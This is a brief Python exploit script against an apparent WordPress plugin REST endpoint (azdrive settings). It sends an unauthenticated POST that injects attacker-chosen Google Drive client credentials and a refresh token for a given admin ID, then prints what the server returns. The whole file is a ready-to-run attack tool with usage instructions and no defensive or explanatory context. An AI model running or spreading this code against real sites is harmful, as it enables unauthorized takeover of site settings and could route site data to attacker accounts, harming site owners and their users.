import requests
import json
import sys

if len(sys.argv) != 3:
    print(f"Usage: python {sys.argv[0]} https://target.site ADMIN_ID")
    sys.exit(1)

target = sys.argv[1].rstrip("/")
admin_id = sys.argv[2]

url = f"{target}/wp-json/azdrive/v1/settings"

payload = {
    "drive_type": "google",
    "google_client_id": "exploit",
    "google_client_secret": "malicious",
    "google_refresh_token": "injected",
    "google_folder_id": "root",
    "admin_id": admin_id
}

headers = {
    "Content-Type": "application/json"
}

print(f"[+] Target: {url}")
print(f"[+] Injecting malicious settings for admin_id={admin_id}")

try:
    response = requests.post(url, headers=headers, json=payload, timeout=10)
    print(f"[+] Status Code: {response.status_code}")
    print("[+] Server Response:")
    print(response.text.strip())
except requests.RequestException as e:
    print(f"[-] Request failed: {e}")
